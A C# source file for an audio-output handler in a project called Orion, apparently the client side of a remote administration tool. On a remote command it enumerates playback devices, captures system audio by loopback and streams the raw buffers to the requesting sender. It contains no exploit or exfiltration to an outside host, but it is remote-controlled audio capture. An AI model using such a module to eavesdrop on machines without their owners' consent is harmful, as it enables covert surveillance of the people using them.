using NAudio.CoreAudioApi;
using NAudio.Wave;
using Orion.Common.Messages;
using Orion.Common.Messages.Audio;
using Orion.Common.Messages.Other;
using Orion.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Orion.Client.Messages
{
    public class AudioOutputHandler : NotificationMessageProcessor, IDisposable
    {
        public override bool CanExecute(IMessage message) => message is GetOutput ||
                                                             message is GetOutputDevice;

        public override bool CanExecuteFrom(ISender sender) => true;

        public ISender _client;

        private bool _isStarted;

        public WasapiLoopbackCapture _audioDevice;

        private int _deviceID;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetOutput msg:
                    Execute(sender, msg);
                    break;

                case GetOutputDevice msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetOutput message)
        {
            if (message.CreateNew)
            {
                try
                {
                    _isStarted = false;
                    _audioDevice?.Dispose();
                    OnReport("扬声器音频串流已启动");
                }
                catch (Exception ex)
                {
                    OnReport($"音频设备清理出错: {ex.Message}");
                }
            }
            if (message.Destroy)
            {
                try
                {
                    Destroy();
                    OnReport("扬声器音频串流已停止");
                }
                catch (Exception ex)
                {
                    OnReport($"停止扬声器音频时出错: {ex.Message}");
                }
                return;
            }
            if (_client == null) _client = client;
            if (!_isStarted)
            {
                try
                {
                    _deviceID = message.DeviceIndex;
                    var enumerator = new MMDeviceEnumerator();
                    var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);

                    if (_deviceID < 0 || _deviceID >= devices.Count)
                    {
                        OnReport($"无效的设备索引: {_deviceID}。可用设备数: {devices.Count}");
                        enumerator.Dispose();
                        return;
                    }
                    var device = devices[_deviceID];
                    if (device == null)
                    {
                        OnReport($"Audio device at index {_deviceID} is null");
                        enumerator.Dispose();
                        return;
                    }

                    OnReport($"正在初始化系统音频设备 {_deviceID}: {device.FriendlyName}");

                    if (device.AudioClient?.MixFormat == null)
                    {
                        OnReport($"音频设备 {_deviceID} 的音频客户端或格式无效");
                        enumerator.Dispose();
                        return;
                    }

                    int sampleRate = message.Bitrate;
                    int channels = device.AudioClient.MixFormat.Channels;
                    var waveFormat = new WaveFormat(sampleRate, channels);

                    _audioDevice = new WasapiLoopbackCapture(device);
                    _audioDevice.WaveFormat = waveFormat;

                    _audioDevice.DataAvailable += sourcestream_DataAvailable;
                    _audioDevice.StartRecording();
                    _isStarted = true;

                    enumerator.Dispose();
                }
                catch (ArgumentOutOfRangeException ex)
                {
                    OnReport($"设备索引超出范围: {ex.Message}");
                    _isStarted = false;
                }
                catch (InvalidOperationException ex)
                {
                    OnReport($"无效的音频操作: {ex.Message}");
                    _isStarted = false;
                }
                catch (System.Runtime.InteropServices.COMException ex)
                {
                    OnReport($"访问音频设备时发生COM错误: {ex.Message}");
                    _isStarted = false;
                }
                catch (UnauthorizedAccessException ex)
                {
                    OnReport($"无权访问音频设备: {ex.Message}");
                    _isStarted = false;
                }
                catch (Exception ex)
                {
                    OnReport($"初始化音频采集时发生意外错误: {ex.Message}");
                    _isStarted = false;
                }
            }
        }

        private void sourcestream_DataAvailable(object sender, WaveInEventArgs e) //fix overheat
        {
            byte[] bufferCopy = new byte[e.BytesRecorded];
            Array.Copy(e.Buffer, bufferCopy, e.BytesRecorded);

            Task.Run(() =>
            {
                try
                {
                    _client.Send(new GetOutputResponse
                    {
                        Audio = bufferCopy,
                        Device = _deviceID
                    });
                }
                catch (Exception ex)
                {
                    OnReport($"发送音频数据时出错: {ex.Message}");
                }
            });
        }

        private void Execute(ISender client, GetOutputDevice message)
        {
            try
            {
                var deviceList = new List<Tuple<int, string>>();
                var enumerator = new MMDeviceEnumerator();
                var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);

                for (int i = 0; i < devices.Count; i++)
                {
                    try
                    {
                        var deviceName = devices[i]?.FriendlyName;
                        if (!string.IsNullOrEmpty(deviceName))
                        {
                            OnReport($"发现系统音频设备 {i}: {deviceName}");
                            deviceList.Add(Tuple.Create(i, deviceName));
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"访问设备 {i} 时出错: {ex.Message}");
                    }
                }
                enumerator.Dispose();

                client.Send(new GetOutputDeviceResponse { DeviceInfos = deviceList });
            }
            catch (Exception ex)
            {
                OnReport($"Error enumerating audio devices: {ex.Message}");
                client.Send(new GetOutputDeviceResponse { DeviceInfos = new List<Tuple<int, string>>() });
            }
        }

        public void Destroy()
        {
            try
            {
                if (_audioDevice != null)
                {
                    try
                    {
                        _audioDevice.DataAvailable -= sourcestream_DataAvailable;
                    }
                    catch (Exception ex)
                    {
                        OnReport($"取消订阅 DataAvailable 事件时出错: {ex.Message}");
                    }

                    try
                    {
                        if (_audioDevice.CaptureState == CaptureState.Capturing)
                        {
                            _audioDevice.StopRecording();
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"停止音频录制时出错: {ex.Message}");
                    }

                    try
                    {
                        _audioDevice.Dispose();
                    }
                    catch (Exception ex)
                    {
                        OnReport($"释放音频设备时出错: {ex.Message}");
                    }

                    _audioDevice = null;
                }
            }
            catch (Exception ex)
            {
                OnReport($"Destroy 方法中出错: {ex.Message}");
            }
            finally
            {
                _isStarted = false;
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    Destroy();
                }
                catch (Exception ex)
                {
                    OnReport($"释放资源时出错: {ex.Message}");
                }
            }
        }
    }
}